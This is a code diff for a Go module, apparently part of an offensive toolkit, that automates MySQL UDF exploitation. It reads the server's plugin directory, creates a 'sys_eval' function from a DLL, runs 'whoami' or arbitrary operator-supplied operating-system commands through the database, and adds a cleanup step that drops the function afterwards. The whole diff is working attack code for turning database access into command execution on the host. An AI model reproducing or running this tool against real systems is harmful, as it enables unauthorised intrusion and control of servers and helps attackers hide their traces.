@@ -1,11 +1,12 @@
 package sqlcmd
 
 import (
+	"cube/log"
 	"cube/model"
 	"database/sql"
 	"fmt"
 	_ "github.com/go-sql-driver/mysql"
-	"log"
+	"strings"
 )
 
 func Mysql(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
@@ -16,10 +17,26 @@ func Mysql(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
 	if err != nil {
 		return
 	}
-	//pluginDir := queryPluginDir(db)
-	//
-	//createUDF(db, strings.Replace(pluginDir+"udftest.dll", "\\", "\\\\", -1))
-	exec(db, "whoami")
+	fmt.Println()
+	if task.Query == "clear" {
+		if checkUDF(db) {
+			clear(db)
+			fmt.Println("[*] drop sys_eval function Successful")
+		} else {
+			fmt.Println("[*] function sys_eval doesn't exist")
+		}
+
+		return
+	}
+
+	if checkUDF(db) {
+		exec(db, task.Query)
+	} else {
+		pluginDir := queryPluginDir(db)
+		createUDF(db, strings.Replace(pluginDir+"udftest.dll", "\\", "\\\\", -1))
+		exec(db, "whoami")
+	}
+
 	return result
 }
 
@@ -27,13 +44,13 @@ func queryPluginDir(db *sql.DB) string {
 	sqlText := "select @@plugin_dir"
 	stmt, err := db.Prepare(sqlText)
 	if err != nil {
-		log.Fatal(err)
+		log.Error(err)
 	}
 	var pluginDir string
 
 	err = stmt.QueryRow().Scan(&pluginDir)
 	if err != nil && err != sql.ErrNoRows {
-		log.Fatal(err)
+		log.Error(err)
 	}
 	return pluginDir
 }
@@ -48,14 +65,14 @@ func createUDF(db *sql.DB, pluginDir string) {
 		"create function sys_eval returns string soname 'udftest.dll';select sys_eval('whoami');", pluginDir)
 	rows, err := db.Query(sqlText)
 	if err != nil {
-		fmt.Println(err)
+		log.Errorf("Err in create UDF: %s", err)
 	}
 
 	cols, _ := rows.Columns()
 	for rows.Next() {
 		err := rows.Scan(&cols[0])
 		if err != nil {
-			fmt.Println(err)
+			log.Error(err)
 		}
 		fmt.Println(cols[0])
 	}
@@ -77,4 +94,33 @@ func exec(db *sql.DB, cmd string) {
 		}
 		fmt.Println(cols[0])
 	}
+}
+
+func checkUDF(db *sql.DB) (b bool) {
+	querySql := fmt.Sprintf("select sys_eval('')")
+	rows, err := db.Query(querySql)
+	if err != nil {
+		fmt.Println(err)
+	}
+	var s sql.NullString
+	//_, _ = rows.Columns()
+	for rows.Next() {
+		err := rows.Scan(&s)
+		if err != nil {
+			fmt.Println(err)
+			b = false
+		} else {
+			b = true
+		}
+	}
+	return b
+}
+
+func clear(db *sql.DB) {
+	querySql := fmt.Sprintf("drop function if exists sys_eval")
+	_, err := db.Query(querySql)
+	if err != nil {
+		fmt.Println(err)
+	}
+
 }
